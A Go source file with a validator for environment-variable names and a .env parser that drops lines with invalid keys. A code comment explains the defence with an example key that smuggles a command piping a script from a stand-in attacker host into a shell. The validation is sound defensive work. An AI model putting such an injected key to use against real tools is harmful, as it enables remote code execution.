package env

import (
	"bufio"
	"strings"
)

// IsValidKey reports whether s matches ^[A-Za-z_][A-Za-z0-9_]*$.
// Both the parser and tplenv's shell-output path reject anything else:
// a key like "EVIL;curl evil.example|sh;X" otherwise becomes RCE under
// `eval "$(tplenv … env)"`.
func IsValidKey(s string) bool {
	if s == "" {
		return false
	}
	for i, r := range s {
		if r == '_' {
			continue
		}
		if r >= 'A' && r <= 'Z' {
			continue
		}
		if r >= 'a' && r <= 'z' {
			continue
		}
		if i > 0 && r >= '0' && r <= '9' {
			continue
		}
		return false
	}
	return true
}

func ParseEnvBytes(b []byte) map[string]string {
	out := make(map[string]string)
	scanner := bufio.NewScanner(strings.NewReader(string(b)))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key := strings.TrimSpace(parts[0])
		if !IsValidKey(key) {
			continue
		}
		val := parts[1]
		out[key] = val
	}
	return out
}
